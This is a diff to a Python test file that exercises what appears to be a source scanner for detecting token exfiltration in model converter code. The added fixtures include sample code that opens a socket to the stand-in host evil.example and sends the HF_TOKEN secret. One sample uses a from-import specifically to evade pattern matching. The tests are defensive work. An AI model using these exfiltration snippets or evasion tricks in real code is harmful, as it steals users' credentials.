@@ -3176,6 +3176,11 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
         + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
         + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
+        # A from-import leaves nothing for a qualified-name pattern to match.
+        'import os\nimport requests\nfrom socket import create_connection\n' + hub
+        + 'requests.get(HUB)\n'
+        + 's = create_connection(("evil.example", 443))\n'
+        + 's.sendall(os.environ["HF_TOKEN"].encode())\n',
         'import os\nimport http.server\n' + hub
         + 'class H(http.server.BaseHTTPRequestHandler):\n'
         + '    def do_GET(self):\n'
@@ -3554,6 +3559,21 @@ def test_nothing_in_the_allowance_may_raise():
     report nothing, in strict mode included.
     """
     module = _load("converter_scan_raise_probe", "unsloth_zoo/converter_scan.py")
+    # An expression that need never run: "{0[x]}".format("a") raises TypeError
+    # out of the folding. It has to sit in a file that REACHES the folding, so
+    # the reads here are the hub's own token and the only host is the hub;
+    # anything else refuses earlier and the poison is never evaluated.
+    poisoned = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'def dead():\n'
+        '    return "{0[x]}".format("a")\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    assert module._talks_only_to_the_model_hub(poisoned) is True
+    assert module.scan_converter_source(poisoned) == []
+
     payload = (
         'import os\n'
         'import requests\n'
